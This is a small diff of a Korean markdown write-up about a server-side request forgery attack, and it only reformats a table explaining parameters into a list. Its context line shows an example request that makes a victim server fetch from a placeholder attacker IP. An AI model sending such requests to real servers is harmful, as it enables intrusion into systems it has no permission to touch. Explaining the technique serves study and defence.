@@ -22,11 +22,9 @@ http://VICTIM_IP:8087/download?server=ATTACKER_IP_ADDRESS&id=75482342
 
 ## 각 파라미터의 의미
 
-| 항목 | 의미 |
-|------|------|
-| `server` | 서버가 요청을 보낼 URL (공격 대상) |
-| `id` | 파일 식별자 (대상마다 다름) |
-| `ATTACKER_IP_ADDRESS` | 공격자 IP |
+- `server`: 서버가 요청을 보낼 URL (공격 대상)
+- `id`: 파일 식별자 (대상마다 다름)
+- `ATTACKER_IP_ADDRESS`: 공격자 IP
 
 ## 실전 흐름
 
